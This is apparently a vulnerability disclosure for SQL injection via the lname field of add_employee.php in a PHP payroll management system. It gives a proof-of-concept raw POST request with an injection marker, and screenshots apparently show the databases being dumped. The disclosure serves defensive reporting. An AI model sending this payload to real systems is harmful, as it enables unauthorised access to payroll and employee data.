# payroll-management-system-in-php has sql injection

## supplier 
https://code-projects.org/payroll-management-system-in-php-with-source-code/
## Vulnerability parameter
add_employee.php

## describe

An unrestricted SQL injection attack exists in payroll-management-system in add_employee.php. The parameters that can be controlled are as follows: $lname. This function executes the id parameter into the SQL statement without any restrictions. A malicious attacker could exploit this vulnerability to obtain sensitive information in the server database.

## vulnerability find

When entering 1 ' in this field, an error occurs, indicating a vulnerability in SQL injection

![Image](https://github.com/user-attachments/assets/64456865-329b-4e0a-9086-842b511dd9d2)

![Image](https://github.com/user-attachments/assets/198de144-31af-4965-9c9e-0486bbc48c17)



**Code analysis**    

When the value of   $lname parameter is obtained in function , it will be concatenated into SQL statements and executed, which has a SQL injection vulnerability. 

![Image](https://github.com/user-attachments/assets/ea219395-1727-45ca-b43f-69e075dadec6)



## POC

```
POST /add_employee.php HTTP/1.1
Host: payroll
Content-Length: 75
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://payroll
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.112 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://payroll/home_employee.php
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=85u4m47klj7ldjr47mclti8mr6
Connection: close

lname=1*&fname=1&gender=Male&emp_type=Job+Order&division=Admin&submit=Submit
```

**Result**

get databases 

![Image](https://github.com/user-attachments/assets/470409fe-38b1-4083-9b77-1804f7d14237)

![image-20241226013405312](https://github.com/user-attachments/assets/fd4a6d5f-7c7d-418d-8db1-2bbd2d5bc9a0)
